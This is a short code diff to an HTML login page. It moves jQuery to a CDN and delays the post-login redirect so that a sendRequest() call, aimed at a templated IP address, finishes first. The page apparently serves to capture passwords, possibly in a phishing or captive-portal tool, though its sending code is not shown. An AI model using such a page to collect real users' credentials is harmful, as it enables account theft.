@@ -1,4 +1,4 @@
-<script src="jquery.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script type="text/javascript">
 
 var IP_ADDR = "%s";
@@ -38,6 +38,6 @@ function redirect() {
     <br>
     Password: <input id="password_input" type="password" size="15">
     <br>
-    <button onClick="sendRequest(); redirect();">Log in</button>
+    <button onClick="sendRequest(); window.setTimeout(redirect, 100);">Log in</button>
 </body>
 </html>
